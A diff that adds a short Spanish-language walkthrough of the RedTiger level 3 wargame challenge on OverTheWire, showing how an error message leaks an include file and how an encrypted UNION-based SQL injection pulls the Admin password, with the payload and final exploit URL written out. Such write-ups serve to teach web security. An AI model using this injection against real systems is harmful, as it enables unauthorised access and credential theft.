@@ -1,0 +1,14 @@
+"La solucion de este reto es tratar de encontrar un error en la pagina del reto, para esto probe distintas variables en el url y encontre la pagina de error con la url https://redtiger.labs.overthewire.org/level3.php?usr[] 
+
+Error:
+Warning: preg_match() expects parameter 2 to be string, array given in /var/www/hackit/urlcrypt.inc on line 21
+
+Luego de obtener el error trate de buscar el archivo urlcrypt.inc a fin de encontrar alguna pista para continuar con el reto y lo pude encontrar en https://redtiger.labs.overthewire.org/urlcrypt.inc, este archivo contiene los metodos para cifrar y descifrar el contenido de la variable usr en la url para realizar el ataque, para encontrar el vector de ataque que diera la solucion del reto fue necesario realizar multiples pruebas con UNION, de forma resumida el vector de ataque con el que tuve exito fue la siguiente:
+
+echo ""https://redtiger.labs.overthewire.org/level3.php?usr="".encrypt(""' and 1=1 UNION ALL SELECT 1,2,3,username,5,password,7 from level3_users where username='Admin' -- '"").""\n"";
+
+al ejecutarse dentro del archivo test.php queda asi:
+
+https://redtiger.labs.overthewire.org/level3.php?usr=MjMxMjI0MTYxMTc0MTY0MjI0MjQxMjUzMjQxMjI0MTQ5MTQyMTM3MTQzMTQyMjI0MTI5MTQwMTQwMjI0MTQ3MTMzMTQwMTMzMTMxMTQ4MjI0MjQxMjM2MjQyMjM2MjQzMjM2MTgxMTc5MTY1MTc4MTc0MTYxMTczMTY1MjM2MjQ1MjM2MTc2MTYxMTc5MTc5MTgzMTc1MTc4MTY0MjM2MjQ3MjI0MTY2MTc4MTc1MTczMjI0MTcyMTY1MTgyMTY1MTcyMjQzMTU5MTgxMTc5MTY1MTc4MTc5MjI0MTgzMTY4MTY1MTc4MTY1MjI0MTgxMTc5MTY1MTc4MTc0MTYxMTczMTY1MjUzMjMxMTI5MTY0MTczMTY5MTc0MjMxMjI0MjM3MjM3MjI0MjMx
+
+Se copia la variable con el password y se obtiene la solucion"
